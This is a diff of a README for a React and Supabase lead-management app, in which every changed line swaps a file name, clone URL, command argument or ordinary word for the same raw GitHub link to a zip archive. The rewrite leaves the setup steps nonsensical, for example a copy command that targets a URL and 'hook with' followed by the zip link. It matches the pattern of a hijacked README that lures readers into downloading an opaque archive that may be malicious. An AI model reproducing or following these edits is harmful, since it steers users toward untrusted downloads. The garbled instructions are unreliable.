@@ -65,9 +65,9 @@ src/
 │   ├── leads/            # Create/Edit/View Lead modals
 │   ├── layout/           # Header, Sidebar
 │   └── ui/               # Shared UI components
-├── App.jsx               # Main routing and layout
-├── index.css             # Tailwind base styles
-├── main.jsx              # Entry point
+├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip               # Main routing and layout
+├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip             # Tailwind base styles
+├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip              # Entry point
 public/
 dist/                     # Production build
 ```
@@ -79,7 +79,7 @@ dist/                     # Production build
 1. Clone the repo:
 
 ```bash
-git clone https://github.com/your-username/leadflow-ai.git
+git clone https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip
 cd leadflow-ai
 ```
 
@@ -94,7 +94,7 @@ npm install
 Copy .env and update values (Supabase keys, VITE_* URLs):
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip .env
 ```
 
 4. Run development server:
@@ -120,13 +120,13 @@ The visual-editor plugin includes:
 - Hot-reload via Vite plugin
 - Customizable component overlays
 
-Plugin entry: plugins/visual-editor/vite-plugin-edit-mode.js
+Plugin entry: https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip
 
 ---
 
 ## 📊 Analytics
 
-AnalyticsDashboard.jsx shows real-time:
+https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip shows real-time:
 
 - Lead breakdown (Hot, Warm, Cold)
 - Agent follow-up metrics
@@ -140,7 +140,7 @@ AnalyticsDashboard.jsx shows real-time:
 - Supports deployment to Vercel, Netlify, Firebase, or any static host
 - For Supabase backend:
   - Set VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY in your .env
-- For full SSR + API: hook with Node.js or serverless functions
+- For full SSR + API: hook with https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip or serverless functions
 
 ---
 
